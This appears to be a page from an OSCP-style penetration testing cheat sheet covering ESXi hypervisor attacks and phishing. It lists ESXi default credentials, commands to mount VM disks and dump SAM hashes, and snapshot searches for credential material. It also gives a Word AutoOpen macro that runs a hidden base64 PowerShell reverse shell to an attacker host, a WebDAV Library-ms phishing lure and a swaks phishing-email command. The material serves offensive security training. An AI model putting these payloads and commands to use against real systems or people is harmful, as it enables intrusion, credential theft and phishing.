# Additional lab topics

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options. This collection includes general lab material; inclusion does not establish exam permission. See [exam rules](../OSCP-Exam-Rules.md).

## Virtualization & Hypervisor Attacks

> Research section covering lateral movement from guest VMs to ESXi hypervisor management interfaces via network misconfiguration — relevant to flat/poorly segmented networks.

### ESXi Management Interface Ports

| Port | Service |
| --- | --- |
| 443 | vSphere Web Client / HTTPS API |
| 902 | VMware ESXi (VMRC / datastore) |
| 5989 | CIM (WBEM / hardware monitoring) |
| 8080 | vSphere SDK / HTTP API |
| 9080 | io-tunneld (older ESXi) |

### Reachability Check from Guest VM

```bash
# Identify ESXi host IP (often the default gateway of the VM segment)
ip route    # show routes and default gateway
ip neigh    # show ARP neighbor table

# Port check against ESXi management interface
for port in 443 902 5989 8080; do                                                                                      # loop through ESXi management ports
    timeout 1 bash -c "</dev/tcp/<ESXi_IP>/$port" 2>/dev/null && echo "Port $port OPEN" || echo "Port $port closed"    # test one TCP port
done                                                                                                                   # finish port checks

nc -zv <ESXi_IP> 443 902 5989 8080             # check ESXi management ports
nmap -sT -p 443,902,5989,8080 <ESXi_IP> -Pn    # scan ESXi management ports
```

### ESXi Fingerprinting

```bash
# Confirm ESXi via HTTP headers / banner
curl -k -I https://<ESXi_IP>/     # fetch HTTPS headers
curl -k https://<ESXi_IP>/ui/     # vSphere HTML5 UI
curl -k https://<ESXi_IP>/sdk/    # vSphere SDK endpoint

# CIM/WBEM enumeration (port 5989)
curl -k https://<ESXi_IP>:5989/    # probe CIM/WBEM endpoint

# Version disclosure
curl -sk https://<ESXi_IP>/host/environ    # check ESXi environment disclosure
```

### vCenter Discovery

```bash
# vCenter is often on a separate management network — look for:
# - Different IP from ESXi host
# - Port 443 with vCenter-specific paths

curl -k https://<TARGET>/ui/                # probe vSphere Client
curl -k https://<TARGET>/vsphere-client/    # probe legacy Flash client
curl -k https://<TARGET>/rest/              # probe vSphere REST API
curl -k https://<TARGET>/sdk/               # probe SOAP API

# Enumerate via DNS
dig vcenter.<DOMAIN>                     # resolve common vCenter hostname
dig @<DNS_IP> _vlso._tcp.<DOMAIN> SRV    # query vCenter lookup service SRV
```

### ESXi Default Credentials

```
root:(blank)
root:vmware
root:password
root:Admin@123
dcui:(blank)
```

### ESXi Authentication (if creds obtained)

```bash
# Login via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/    # authenticate to ESXi SOAP API

# PowerCLI (Windows)
Connect-VIServer -Server <ESXi_IP> -User root -Password <PASSWORD>    # connect PowerCLI to ESXi
Get-VM                                                                # list virtual machines
Get-Datastore                                                         # list datastores
```

### VMDK Exposure

```bash
# If datastore is accessible (port 902 or NFS/CIFS shares exposed)
# List datastores via API
curl -k -u 'root:<PASSWORD>' https://<ESXi_IP>/sdk/ --data '<SOAP_ENVELOPE>'    # send SOAP request to ESXi

# Mount VMDK locally for offline analysis
# On Linux (vmware-vdiskmanager or qemu-nbd):
sudo modprobe nbd                                   # load network block device module
sudo qemu-nbd -r -c /dev/nbd0 /path/to/disk.vmdk    # attach VMDK read-only
sudo mount /dev/nbd0p1 /mnt/vmdk                    # mount VMDK partition

# Extract credential files from Windows VMDK
ls /mnt/vmdk/Windows/System32/config/                                    # SAM, SYSTEM, SECURITY
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL    # dump hashes from mounted hives
```

### Blast Radius Assessment

```bash
# From ESXi access — enumerate all VMs
# Via esxcli (if SSH enabled on ESXi)
ssh root@<ESXi_IP>                     # SSH to ESXi host
esxcli vm process list                 # list running VMs
esxcli storage filesystem list         # list ESXi filesystems
vim-cmd vmsvc/getallvms                # list registered VMs
vim-cmd vmsvc/power.getstate <VMID>    # check VM power state

# Snapshot enumeration (may contain credential material)
vim-cmd vmsvc/snapshot.get <VMID>                 # list VM snapshots
find /vmfs/volumes/ -name "*.vmem" 2>/dev/null    # VM memory snapshots
find /vmfs/volumes/ -name "*.vmsn" 2>/dev/null    # VM suspend files
```

### ESXi Network Misconfiguration Context

```bash
# On guest VM — check if management VLAN is reachable
# Signs of flat network: ESXi mgmt IP is in same /24 as guest VM
# or gateway IP responds on port 443/902

# Test from guest VM
traceroute <ESXi_IP>       # check hop distance to ESXi
arp -n | grep <ESXi_IP>    # check local ARP visibility

# If ESXi is directly adjacent (1 hop), network is likely flat/unsegmented
```

---

## Social Engineering Tools

### Microsoft Office Word Macro (Phishing)

```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    ' Paste base64-encoded powershell payload split into 50-char chunks:
    Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
    ' ...
    CreateObject("Wscript.Shell").Run Str
End Sub
```

```bash
# Encode payload (pwsh)
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);...'    # define PowerShell payload
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                              # convert payload to UTF-16LE bytes
[Convert]::ToBase64String($Bytes)                                                     # base64 encode payload
```

### Windows Library Files (WebDAV Phishing)

```bash
pip3 install wsgidav                                                         # install WebDAV server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/webdav/    # host anonymous WebDAV share
```

```xml
<!-- config.Library-ms -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>http://<LHOST></url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

```bash
# Send phishing email with attachment
swaks --server <RHOST> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach @<FILE> --suppress-data -ap    # send test email with attachment
```
